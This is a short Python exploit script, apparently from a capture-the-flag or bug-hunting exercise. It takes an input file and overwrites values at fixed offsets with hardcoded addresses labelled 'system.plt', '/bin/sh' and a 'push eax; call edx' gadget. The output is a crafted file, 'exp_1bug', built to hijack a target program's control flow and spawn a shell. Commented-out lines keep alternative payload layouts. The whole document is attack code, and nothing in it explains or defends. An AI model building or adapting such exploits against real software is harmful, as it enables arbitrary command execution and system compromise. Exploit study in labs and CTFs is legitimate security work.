import sys, struct

addr = 0x08050823
#addr = 0x0806ffff
offset = 0xd10

with open(sys.argv[1], 'rb') as fd:
    data = fd.read()

nd = data[:offset] + struct.pack('<I', addr) + data[offset+4:]

#addr = 0x0806ffff
addr = 0x08048790    # system.plt
offset = 0xc5d+0x1c
nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]

addr = 0x08052914    # /bin/sh
offset = 0xc5d
nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]

#addr = 0x08048790    # system.plt
#offset = 0xc5d+0x24
#nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]

addr = 0x0804894f    # push eax; call edx
offset = 0xc5d+0x40
nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]

#system_addr = 0x08048890
#binsh_addr = 0x0806c6b7
#offset = 0x323
#nd = nd[:offset] + struct.pack('<I', system_addr) + 'HHHH' + struct.pack('<I', binsh_addr) + nd[offset+12:]

with open('exp_1bug', 'wb') as fd:
    fd.write(nd)
